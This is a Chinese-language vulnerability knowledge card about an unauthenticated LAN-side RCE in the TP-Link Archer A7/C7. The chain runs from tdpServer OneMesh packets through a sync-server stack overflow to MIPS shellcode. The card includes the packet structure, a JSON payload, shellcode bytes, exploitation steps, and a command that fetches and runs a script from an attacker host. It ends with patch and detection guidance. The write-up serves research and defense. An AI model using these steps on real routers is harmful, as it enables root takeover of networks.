---
id: iot-tplink-ac1750-tdpserver-onemesh-sync-server-stack-overflow-rce
title: TP-Link AC1750（Archer A7/C7）LAN 侧未授权 RCE：tdpServer 共享内存注入 → sync-server OneMesh 列表栈溢出覆写 $ra 执行 RWX 堆 shellcode
type: scenario
domain: iot
path: iot
technique: tplink-tdpserver-onemesh-shm-stack-overflow-rce
aliases:
- TP-Link AC1750 RCE
- Archer A7 RCE
- tdpServer
- sync-server OneMesh 栈溢出
- slave_key_offer
- tdp协议
tags:
- iot
- router
- tplink
- mips
- stack-overflow
- shellcode
- shared-memory
- rce
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-13'
updated: '2026-11-13'
verification:
  verified_by: verifier-V672
  verified_at: '2026-11-13T10:28:53+08:00'
  notes: 已对照原文与01-09图核对：02图 tdp_packet 结构（version/type 0xF8 onemesh/opcode/len/flags/align/sn/crc32/payload[0x400]）、03图 slave_key_offer JSON、04图 onemesh_listDevices 从 SHM 取 mac/ip/model、05图 _handle_request_clients_async 中 char *arr_ip_mac[64] 与 arr_ip_mac[i*2]/[i*2+1] 无边界、06图 count is 3、07图 count is 49 后 Illegal instruction、08图 exploit.sh 第二次尝试 nc 成功且 uname -a=Linux ArcherA7v5 3.3.8 mips、id=uid=0(root)、09图补丁 if (!v13 || !v12 || v10 >= 64) break 均一致；溢出点/利用链（tdpServer SHM 注入→sync-server 栈溢出覆写 $fp/$ra→RWX 堆 shellcode jal system/move $a0,$s2）与原文一致，ASLR 绕过与 80 秒定时/重试描述有据。修正：wiki 链接 binary-pwn-stack-32bit-ret2syscall 不存在，已改为库内实际卡 binary-pwn-stack-ret2syscall-32bit（staging 与 knowledge 同步修正）。原文无显式受影响固件版本/区间，affected_versions 整行省略。dedup：仅 TP-Link SR20 TDDP 卡（不同守护进程/TDDP v1 命令注入）判 related，非同链，其余 new，无删卡。未验证点：未复现，CVE 编号原文未给故 cve 为空。
---

## 一句话结论

TP-Link AC1750（Archer A7/C7）LAN 侧的 tdpServer 在 UDP 20002 上解析 TDP 协议，把 OneMesh `slave_key_offer` 报文中的 ip/mac/model 等 JSON 字段写入共享内存；sync-server 每 80 秒读取共享内存构造设备列表，将每台设备的 ip/mac 指针逐个写入栈数组 `char *arr_ip_mac[64]` 且不做边界检查，超过 32 台设备即溢出覆写 `$fp/$ra`。由于二进制非 PIE、堆可执行（RWX），恢复的 `$ra` 指向攻击者可控的堆数据，直接执行 `jal system` shellcode 即可以 root 权限执行命令（原文实测拿到 `uid=0` shell）。

## 原理

- **tdpServer 与 TDP 协议**：tdpServer 监听 LAN 侧 UDP 20002，使用专有 TDP 协议；报文头为固定结构 `version(1) + type + opcode + len + flags + align + sn + crc32 + payload[0x400]`，payload 为 JSON。`type=0xF8` 表示 OneMesh，`opcode=0x0007` 表示 `slave_key_offer`；payload 里的 `ip`、`slave_mac`、`model`、`product_type`、`want_to_join` 等字段经宽松校验后写入共享内存（SHM）。
- **sync-server 的解析**：sync-server 周期性调用 `_handle_request_clients_async`（原文日志 `sync-server:_handle_request_clients_async:2494`），通过 `onemesh_listDevices` 把 SHM 中的设备转成 JSON 链表；函数内声明 `char *arr_ip_mac[64]`，循环中 `arr_ip_mac[i*2] = ip_as_str; arr_ip_mac[i*2+1] = mac_as_str;`，没有对设备数量做上限检查。
- **溢出点**：`arr_ip_mac[64]` 最多容纳 32 台设备（每台两个指针）；当 SHM 中设备数超过 32，写入越过数组尾部，覆盖栈上保存的寄存器（含 `$fp`、`$ra`）。原文发送 50 个 OneMesh 报文后 sync-server 崩溃（`Illegal instruction`）。
- **为什么能绕过 ASLR**：溢出写入的是指向受控数据的**指针**（ip/mac 字符串地址），不是 payload 原始字节；而当 `$ra` 从栈恢复时会直接跳向这些指针指向的数据。设备上堆段权限为 RWX，且 sync-server 非 PIE，因此把 shellcode 放进可控数据（如 mac 字段）后，`$ra` 恢复即执行，无需泄露地址。
- **指令构造**：MIPS 指令 4 字节，受 JSON 语法与格式检查限制，payload 每字符只能取 `[0x00-0xff]` 的一小部分，且 mac 长度限制 17 字节；利用 JSON 的 `\u00xx` Unicode 转义可向 SHM 写入 `[0x01-0xff]` 字节，唯一限制是避免空字节。sync-server 非 PIE，`system()` 地址固定，`jal system` 编码为 `0C 10 07 14`（不含空字节）；MIPS 分支延迟槽中放 `move $a0,$s2`（`02 40 20 25`），而 `$s2` 从栈恢复时指向一个 ip 值，即命令字符串。最终 shellcode 前 8 字节为 `0c 10 07 14 02 40 20 25`（原文写作 `\u000c\u0010\u0007\u0014\u0002@ %`）。
- **去重与命令长度**：tdpServer 有重复数据删除例程，原文给每个 mac 附加唯一 ID 保证写入 SHM；ip 值使用 `cmd;num_id` 形式，命令长度约 12-15 字节。sync-server 只能启动一条命令且随即崩溃。
- **扩展为交互 shell**：利用长度有限的命令启动 tddp（默认未启动的调试守护程序，带 Lua 绑定 shell），或执行 `wget http://attacker:8000/pwn.sh && chmod +x pwn.sh && ./pwn.sh` 下载脚本；tdpServer、sync-server、tddp 均以 root 运行，因此直接获得最高权限。
- **时序**：sync-server 每 80 秒被调用一次，首次常常只解析 20-30 个新设备而不触发；重试后成功概率超过 99%，通常 160 秒内拿到 shell。
- **补丁**：TP-Link 在漏洞函数中增加计数检查 `if (!v13 || !v12 || v10 >= 64) break;`，即使 SHM 中对象超过 64 个也不再越界写数组。

## 触发条件

- 目标为 TP-Link AC1750/Archer A7（及同源 Archer C7 v5 等）且未安装修复固件。
- 攻击者位于路由器 LAN 侧，可向 UDP 20002 发送 TDP 报文；无需任何凭据。
- 设备上 sync-server 按 80 秒周期解析 OneMesh 设备 SHM（默认行为）。
- 需要维持攻击约 80-160 秒以等待定时回调；仅限授权测试。

## 利用步骤

1. **准备**：确认 LAN 可达 UDP 20002；按 TDP 结构构造 `type=0xF8`、`opcode=0x0007` 的 `slave_key_offer` 报文，payload 为 JSON（含 `group_id`、`ip`、`slave_mac`、`model`、`product_type`、`want_to_join` 等）。
2. **写入 SHM**：批量发送 49-50 个不同 mac（带唯一 ID 避免去重）的报文，使 SHM 中设备数超过 32；`ip` 设为带 shellcode 的 `cmd;num_id`，`mac` 设为含 `\u00xx` 转义编码的 shellcode（`jal system; move $a0,$s2`）。
3. **等待触发**：等待 sync-server 的 80 秒定时回调解析 SHM；观察 `/tmp/sync-server/request-input-*`、`request-output-*` 日志与进程是否崩溃重启。
4. **重试**：首次失败属正常，重复步骤 2-3；成功时 sync-server 执行命令。
5. **取 shell**：命令启动 tddp（Lua 绑定 shell）或下载并执行 `pwn.sh`（原文用 `wget http://attacker:8000/pwn.sh && chmod +x pwn.sh && ./pwn.sh`），连接回连端口获得 root shell。

## PoC

TDP 报文结构（原文）：

```c
typedef struct tdp_packet {
    uint8_t  version;      // fixed to 1
    uint8_t  type;         // 0xF8 is onemesh
    uint16_t opcode;       // used by the onemesh main switch table
    uint16_t len;          // packet length
    uint8_t  flags;        // some flags (fixed)
    uint8_t  align;        // struct alignment
    uint32_t sn;           // serial number, any value
    uint32_t crc32;        // packet checksum
    uint8_t  payload[0x400]; // JSON, max 0x400 bytes
} packet;
```

`slave_key_offer` JSON 示例：

```json
{
  "method": "slave_key_offer",
  "data": {
    "group_id": "1",
    "ip": "1.3.3.7",
    "slave_mac": "00:11:22:33:44:55",
    "slave_private_account": "admin",
    "slave_private_password": "admin",
    "want_to_join": true,
    "model": "pwned",
    "product_type": "tplink",
    "operation_mode": "whatever",
    "signal_strength_24g": 2,
    "signal_strength_5g": 2,
    "link_speed_24g": 1,
    "link_speed_5g": 1,
    "level": 3,
    "connection_type": "whatever"
  }
}
```

核心 shellcode 指令（MIPS 大端）：

```text
0C 10 07 14    jal system        ; system() 非 PIE 固定地址
02 40 20 25    move $a0, $s2     ; $s2 恢复为指向 ip（命令字符串）的指针
```

原文用 `exploit.sh` 协调 `tdpwn.py`（大量关联设备）、`tdp.py`（命令注入）与 `pwn.sh`，输出显示第二次尝试后 `nc` 成功连接，`uname -a` 为 `Linux ArcherA7v5 3.3.8 mips GNU/Linux`、`id` 为 `uid=0(root)`。

## 变体与关联

- 变体：同一 SHM 数据面还被 Web 界面等其他程序使用，其他消费 SHM 的组件若有类似“数量不设限的数组拷贝”也可成为 sink；命令长度受限时可换 tddp/Lua 或下载脚本执行。
- 关联：[[iot-tplink-sr20-tddp-v1-udp-cmd-injection-lua]]（TP-Link TDDP 调试协议与 Lua 执行）、[[iot-mikrotik-chimay-red-stackclash-tinyshell-upload]]（路由器二进制漏洞利用链的同类）、[[binary-pwn-stack-ret2syscall-32bit]]（32 位栈溢出与寄存器控制基础）。
- 边界：修复固件在漏洞函数中加入 `v10 >= 64` 计数检查后，数组不再越界，本链失效。

## 检测与防御

- **修复**：升级 TP-Link 官方固件（OneMesh/IPv6 相关模块修复）。
- **暴露面**：限制 LAN 内对 UDP 20002 的访问（仅可信设备/网段）；关闭不必要的 OneMesh 功能。
- **检测**：LAN 内出现大量不同 mac 的 TDP `type=0xF8/opcode=0x0007` 报文；sync-server 日志出现 `count is 49` 等异常设备数并伴随崩溃重启（`Illegal instruction`）；`/tmp/sync-server/` 下不断生成 request-input/output 文件；tddp 进程被异常拉起；路由器向外下载脚本或发起反向连接。
- **注意**：该漏洞无需认证且最终以 root 执行，LAN 侧任何可发包设备都是潜在攻击源。
